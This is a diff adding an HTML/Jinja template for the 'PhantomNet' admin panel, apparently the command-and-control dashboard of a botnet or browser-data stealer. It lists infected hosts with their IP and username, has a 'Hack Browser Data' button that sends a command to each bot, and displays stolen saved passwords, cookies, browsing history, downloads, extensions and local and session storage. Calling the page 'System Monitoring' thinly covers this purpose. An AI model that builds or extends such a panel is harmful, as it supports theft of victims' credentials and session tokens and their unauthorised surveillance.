@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhantomNet Admin Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .sidebar {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .sidebar .nav-link {
+            color: rgba(255,255,255,0.8);
+            padding: 12px 20px;
+            margin: 2px 0;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+        .sidebar .nav-link:hover, .sidebar .nav-link.active {
+            color: white;
+            background: rgba(255,255,255,0.1);
+            transform: translateX(5px);
+        }
+        .main-content {
+            background: #f8f9fa;
+            min-height: 100vh;
+        }
+        .bot-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid #667eea;
+        }
+        .data-section {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-3 col-lg-2 sidebar p-0">
+                <div class="p-4">
+                    <h4 class="text-white mb-4">
+                        <i class="fas fa-ghost me-2"></i>
+                        PhantomNet
+                    </h4>
+                    <nav class="nav flex-column">
+                        <a class="nav-link active" href="#">
+                            <i class="fas fa-tachometer-alt me-2"></i>
+                            Dashboard
+                        </a>
+                        <hr class="text-white-50">
+                        <a class="nav-link" href="/admin/logout">
+                            <i class="fas fa-sign-out-alt me-2"></i>
+                            Logout
+                        </a>
+                    </nav>
+                </div>
+            </div>
+
+            <div class="col-md-9 col-lg-10 main-content p-4">
+                <div class="d-flex justify-content-between align-items-center mb-4">
+                    <h2><i class="fas fa-tachometer-alt me-2"></i>System Monitoring Dashboard</h2>
+                    <span class="text-muted">{{ datetime.now().strftime('%Y-%m-%d %H:%M:%S') }}</span>
+                </div>
+
+                <div id="systems" class="mb-5">
+                    <h3 class="mb-4"><i class="fas fa-robot me-2"></i>Connected Systems</h3>
+                    {% if bots %}
+                        {% for bot in bots %}
+                        <div class="bot-card">
+                            <div class="row">
+                                <div class="col-md-8">
+                                    <h5><i class="fas fa-desktop me-2"></i>{{ bot.hostname or bot.id }}</h5>
+                                    <p class="text-muted mb-2">
+                                        <strong>IP:</strong> {{ bot.ip_address }} | 
+                                        <strong>OS:</strong> {{ bot.os_info }} | 
+                                        <strong>User:</strong> {{ bot.username }}
+                                    </p>
+                                    <p class="text-muted mb-2">
+                                        <strong>Registered:</strong> {{ bot.registered_at.strftime('%Y-%m-%d %H:%M:%S') }} | 
+                                        <strong>Last Seen:</strong> {{ bot.last_seen.strftime('%Y-%m-%d %H:%M:%S') if bot.last_seen else 'Never' }}
+                                    </p>
+                                </div>
+                                <div class="col-md-4 text-end">
+                                    <span class="badge bg-{{ 'success' if bot.status == 'active' else 'secondary' }}">{{ bot.status.title() }}</span>
+                                </div>
+                            </div>
+                            <div class="mt-3">
+                                <form action="/admin/commands" method="post" class="d-inline">
+                                    <input type="hidden" name="bot_id" value="{{ bot.id }}">
+                                    <input type="hidden" name="command" value="hack_browser_data">
+                                    <button type="submit" class="btn btn-primary btn-sm">
+                                        <i class="fas fa-user-secret me-2"></i>
+                                        Hack Browser Data
+                                    </button>
+                                </form>
+                            </div>
+
+                            {% if bot_data[bot.id].credentials %}
+                            <div class="data-section">
+                                <h6><i class="fas fa-key me-2"></i>Credentials</h6>
+                                <div class="table-responsive">
+                                    <table class="table table-sm">
+                                        <thead>
+                                            <tr>
+                                                <th>Browser</th>
+                                                <th>URL</th>
+                                                <th>Username</th>
+                                                <th>Password</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for cred in bot_data[bot.id].credentials %}
+                                            <tr>
+                                                <td>{{ cred.browser }}</td>
+                                                <td>{{ cred.url }}</td>
+                                                <td>{{ cred.username }}</td>
+                                                <td>{{ cred.password }}</td>
+                                            </tr>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            {% endif %}
+                            {% if bot_data[bot.id].bookmarks %}
+                            <div class="data-section">
+                                <h6><i class="fas fa-bookmark me-2"></i>Bookmarks</h6>
+                                <div class="table-responsive">
+                                    <table class="table table-sm">
+                                        <thead>
+                                            <tr>
+                                                <th>Browser</th>
+                                                <th>Name</th>
+                                                <th>URL</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for bookmark in bot_data[bot.id].bookmarks %}
+                                            <tr>
+                                                <td>{{ bookmark.browser }}</td>
+                                                <td>{{ bookmark.name }}</td>
+                                                <td>{{ bookmark.url }}</td>
+                                            </tr>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            {% endif %}
+                            {% if bot_data[bot.id].cookies %}
+                            <div class="data-section">
+                                <h6><i class="fas fa-cookie-bite me-2"></i>Cookies</h6>
+                                <div class="table-responsive">
+                                    <table class="table table-sm">
+                                        <thead>
+                                            <tr>
+                                                <th>Browser</th>
+                                                <th>Host</th>
+                                                <th>Key</th>
+                                                <th>Value</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for cookie in bot_data[bot.id].cookies %}
+                                            <tr>
+                                                <td>{{ cookie.browser }}</td>
+                                                <td>{{ cookie.host }}</td>
+                                                <td>{{ cookie.key_name }}</td>
+                                                <td>{{ cookie.value }}</td>
+                                            </tr>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            {% endif %}
+                             {% if bot_data[bot.id].history %}
+                            <div class="data-section">
+                                <h6><i class="fas fa-history me-2"></i>History</h6>
+                                <div class="table-responsive">
+                                    <table class="table table-sm">
+                                        <thead>
+                                            <tr>
+                                                <th>Browser</th>
+                                                <th>Title</th>
+                                                <th>URL</th>
+                                                <th>Visit Count</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for item in bot_data[bot.id].history %}
+                                            <tr>
+                                                <td>{{ item.browser }}</td>
+                                                <td>{{ item.title }}</td>
+                                                <td>{{ item.url }}</td>
+                                                <td>{{ item.visit_count }}</td>
+                                            </tr>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            {% endif %}
+                            {% if bot_data[bot.id].downloads %}
+                            <div class="data-section">
+                                <h6><i class="fas fa-download me-2"></i>Downloads</h6>
+                                <div class="table-responsive">
+                                    <table class="table table-sm">
+                                        <thead>
+                                            <tr>
+                                                <th>Browser</th>
+                                                <th>Path</th>
+                                                <th>URL</th>
+                                                <th>Total Bytes</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for item in bot_data[bot.id].downloads %}
+                                            <tr>
+                                                <td>{{ item.browser }}</td>
+                                                <td>{{ item.target_path }}</td>
+                                                <td>{{ item.url }}</td>
+                                                <td>{{ item.total_bytes }}</td>
+                                            </tr>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            {% endif %}
+                            {% if bot_data[bot.id].extensions %}
+                            <div class="data-section">
+                                <h6><i class="fas fa-puzzle-piece me-2"></i>Extensions</h6>
+                                <div class="table-responsive">
+                                    <table class="table table-sm">
+                                        <thead>
+                                            <tr>
+                                                <th>Browser</th>
+                                                <th>Name</th>
+                                                <th>Description</th>
+                                                <th>Version</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for item in bot_data[bot.id].extensions %}
+                                            <tr>
+                                                <td>{{ item.browser }}</td>
+                                                <td>{{ item.name }}</td>
+                                                <td>{{ item.description }}</td>
+                                                <td>{{ item.version }}</td>
+                                            </tr>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            {% endif %}
+                            {% if bot_data[bot.id].local_storage %}
+                            <div class="data-section">
+                                <h6><i class="fas fa-database me-2"></i>Local Storage</h6>
+                                <div class="table-responsive">
+                                    <table class="table table-sm">
+                                        <thead>
+                                            <tr>
+                                                <th>Browser</th>
+                                                <th>URL</th>
+                                                <th>Key</th>
+                                                <th>Value</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for item in bot_data[bot.id].local_storage %}
+                                            <tr>
+                                                <td>{{ item.browser }}</td>
+                                                <td>{{ item.url }}</td>
+                                                <td>{{ item.key }}</td>
+                                                <td>{{ item.value }}</td>
+                                            </tr>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            {% endif %}
+                            {% if bot_data[bot.id].session_storage %}
+                            <div class="data-section">
+                                <h6><i class="fas fa-database me-2"></i>Session Storage</h6>
+                                <div class="table-responsive">
+                                    <table class="table table-sm">
+                                        <thead>
+                                            <tr>
+                                                <th>Browser</th>
+                                                <th>URL</th>
+                                                <th>Key</th>
+                                                <th>Value</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for item in bot_data[bot.id].session_storage %}
+                                            <tr>
+                                                <td>{{ item.browser }}</td>
+                                                <td>{{ item.url }}</td>
+                                                <td>{{ item.key }}</td>
+                                                <td>{{ item.value }}</td>
+                                            </tr>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            {% endif %}
+                        </div>
+                        {% endfor %}
+                    {% else %}
+                    <div class="text-center py-5">
+                        <i class="fas fa-robot fa-3x text-muted mb-3"></i>
+                        <h4 class="text-muted">No Systems Connected</h4>
+                        <p class="text-muted">No systems are currently connected to the monitoring platform.</p>
+                    </div>
+                    {% endif %}
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
